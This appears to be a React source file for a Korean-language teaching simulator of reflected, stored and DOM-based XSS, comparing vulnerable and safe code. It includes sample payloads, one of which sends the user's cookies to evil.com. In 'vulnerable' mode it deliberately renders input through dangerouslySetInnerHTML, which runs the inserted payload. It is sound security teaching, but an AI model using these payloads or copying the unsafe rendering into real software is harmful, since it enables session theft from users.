"use client";

import React, { useState } from "react";
import { getColorClasses } from "@/utils/colorMigration";

interface XSSExample {
  type: "reflected" | "stored" | "dom";
  title: string;
  description: string;
  vulnerableCode: string;
  safeCode: string;
  attackVector: string;
  result: string;
}

const xssExamples: XSSExample[] = [
  {
    type: "reflected",
    title: "반사형 XSS - URL 파라미터",
    description: "URL 파라미터를 그대로 페이지에 출력할 때 발생하는 취약점",
    vulnerableCode: `// 취약한 코드
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

// 위험! HTML에 직접 삽입
document.getElementById('greeting').innerHTML = 
  \`안녕하세요, \${name}님!\`;`,
    safeCode: `// 안전한 코드
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');

// 안전! textContent 사용
document.getElementById('greeting').textContent = 
  \`안녕하세요, \${name}님!\`;`,
    attackVector: "?name=<script>alert('XSS Attack!')</script>",
    result: "스크립트가 실행되어 alert 창이 표시됩니다!",
  },
  {
    type: "stored",
    title: "저장형 XSS - 댓글 시스템",
    description: "사용자 입력을 데이터베이스에 저장하고 다시 출력할 때 발생",
    vulnerableCode: `// React에서 위험한 코드
function Comment({ content }) {
  // 위험! HTML을 그대로 렌더링
  return (
    <div dangerouslySetInnerHTML={{ __html: content }} />
  );
}`,
    safeCode: `// React에서 안전한 코드
function Comment({ content }) {
  // 안전! React가 자동으로 이스케이프 처리
  return (
    <div>{content}</div>
  );
}

// 또는 DOMPurify 라이브러리 사용
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const cleanHTML = DOMPurify.sanitize(content);
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
  );
}`,
    attackVector: "<img src=x onerror='alert(\"XSS Attack!\")'>",
    result: "모든 사용자가 페이지를 방문할 때마다 스크립트가 실행됩니다!",
  },
  {
    type: "dom",
    title: "DOM 기반 XSS - 동적 콘텐츠",
    description: "JavaScript로 DOM을 조작할 때 발생하는 클라이언트 측 취약점",
    vulnerableCode: `// 취약한 코드
function updateContent() {
  const userInput = document.getElementById('input').value;
  
  // 위험! eval 사용
  eval(userInput);
  
  // 또는 위험한 DOM 조작
  document.body.innerHTML += userInput;
}`,
    safeCode: `// 안전한 코드
function updateContent() {
  const userInput = document.getElementById('input').value;
  
  // 안전! 텍스트 노드 생성
  const textNode = document.createTextNode(userInput);
  document.body.appendChild(textNode);
  
  // 또는 textContent 사용
  const div = document.createElement('div');
  div.textContent = userInput;
  document.body.appendChild(div);
}`,
    attackVector: "<img src=x onerror='document.location=\"http://evil.com?cookie=\"+document.cookie'>",
    result: "쿠키가 공격자 서버로 전송됩니다!",
  },
];

const XSSSimulator = () => {
  const [selectedExample, setSelectedExample] = useState<XSSExample>(xssExamples[0]);
  const [isVulnerable, setIsVulnerable] = useState(true);
  const [showAttack, setShowAttack] = useState(false);
  const [inputValue, setInputValue] = useState("");

  const simulateAttack = () => {
    if (isVulnerable) {
      setShowAttack(true);
      setTimeout(() => setShowAttack(false), 3000);
    }
  };

  const sanitizeInput = (input: string): string => {
    return input
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;")
      .replace(/\//g, "&#x2F;");
  };

  return (
    <div className="space-y-6">
      {/* XSS 타입 선택 */}
      <div>
        <h4 className="text-lg font-semibold text-gray-800 mb-3">XSS 공격 유형 선택</h4>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          {xssExamples.map((example) => (
            <button
              key={example.type}
              onClick={() => {
                setSelectedExample(example);
                setShowAttack(false);
                setInputValue("");
              }}
              className={`
                p-4 rounded-lg border-2 transition-all duration-200
                ${
                  selectedExample.type === example.type
                    ? `${getColorClasses(
                        'border-red-500',
                        'bg-red-50',
                        'text-red-700'
                      )}`
                    : 'border-gray-200 hover:border-gray-300 bg-white'
                }
              `}
            >
              <div className="font-semibold">{example.title}</div>
              <div className="text-xs text-gray-600 mt-1">{example.description}</div>
            </button>
          ))}
        </div>
      </div>

      {/* 시뮬레이션 영역 */}
      <div className={`bg-gradient-to-r ${getColorClasses(
        'from-gray-50 to-gray-100'
      )} rounded-lg p-6`}>
        <div className="mb-4">
          <label className="flex items-center gap-3">
            <input
              type="checkbox"
              checked={isVulnerable}
              onChange={(e) => setIsVulnerable(e.target.checked)}
              className="w-5 h-5"
            />
            <span className="font-medium">취약한 코드 사용 (보안 검증 비활성화)</span>
          </label>
        </div>

        <div className="space-y-4">
          {/* 사용자 입력 */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              사용자 입력 시뮬레이션
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder="여기에 입력하세요..."
                className="flex-1 px-3 py-2 border border-gray-300 rounded-lg"
              />
              <button
                onClick={() => setInputValue(selectedExample.attackVector)}
                className={`px-4 py-2 rounded-lg font-medium text-sm ${getColorClasses(
                  'bg-red-500',
                  'text-white',
                  'hover:bg-red-600'
                )}`}
              >
                공격 코드 삽입
              </button>
            </div>
          </div>

          {/* 결과 표시 */}
          <div className="bg-white rounded-lg p-4 border">
            <h5 className="font-semibold text-gray-800 mb-2">렌더링 결과</h5>
            <div className={`p-3 rounded border-2 ${
              showAttack 
                ? 'border-red-500 bg-red-50' 
                : 'border-gray-200 bg-gray-50'
            }`}>
              {isVulnerable ? (
                <div className="text-gray-700">
                  {showAttack ? (
                    <div className="text-red-600 font-bold animate-pulse">
                      ⚠️ XSS 공격 감지! {selectedExample.result}
                    </div>
                  ) : (
                    <div dangerouslySetInnerHTML={{ __html: inputValue || "입력을 기다리는 중..." }} />
                  )}
                </div>
              ) : (
                <div className="text-gray-700">
                  {sanitizeInput(inputValue) || "입력을 기다리는 중..."}
                </div>
              )}
            </div>
          </div>

          <button
            onClick={simulateAttack}
            className={`w-full py-3 rounded-lg font-medium transition-all duration-200 ${
              isVulnerable
                ? getColorClasses('bg-red-500', 'text-white', 'hover:bg-red-600')
                : getColorClasses('bg-green-500', 'text-white', 'hover:bg-green-600')
            }`}
          >
            {isVulnerable ? '🔥 공격 시뮬레이션' : '✅ 안전한 처리 확인'}
          </button>
        </div>
      </div>

      {/* 코드 비교 */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
          <h5 className="font-semibold text-red-700 mb-2">❌ 취약한 코드</h5>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg font-mono text-sm overflow-x-auto">
            <pre>{selectedExample.vulnerableCode}</pre>
          </div>
        </div>
        <div>
          <h5 className="font-semibold text-green-700 mb-2">✅ 안전한 코드</h5>
          <div className="bg-gray-900 text-gray-100 p-4 rounded-lg font-mono text-sm overflow-x-auto">
            <pre>{selectedExample.safeCode}</pre>
          </div>
        </div>
      </div>

      {/* 방어 기법 */}
      <div className={`bg-gradient-to-r ${getColorClasses(
        'from-blue-50 to-indigo-50'
      )} rounded-lg p-4 border border-blue-200`}>
        <h5 className="font-semibold text-blue-800 mb-3">🛡️ XSS 방어 기법</h5>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
          <div>
            <h6 className="font-semibold text-gray-700 mb-2">입력 검증</h6>
            <ul className="text-gray-600 space-y-1">
              <li>• 화이트리스트 기반 입력 검증</li>
              <li>• 특수 문자 필터링</li>
              <li>• 길이 제한 설정</li>
              <li>• 정규식을 활용한 패턴 검증</li>
            </ul>
          </div>
          <div>
            <h6 className="font-semibold text-gray-700 mb-2">출력 이스케이프</h6>
            <ul className="text-gray-600 space-y-1">
              <li>• HTML 엔티티 인코딩</li>
              <li>• JavaScript 문자열 이스케이프</li>
              <li>• URL 인코딩</li>
              <li>• CSS 값 이스케이프</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export { XSSSimulator };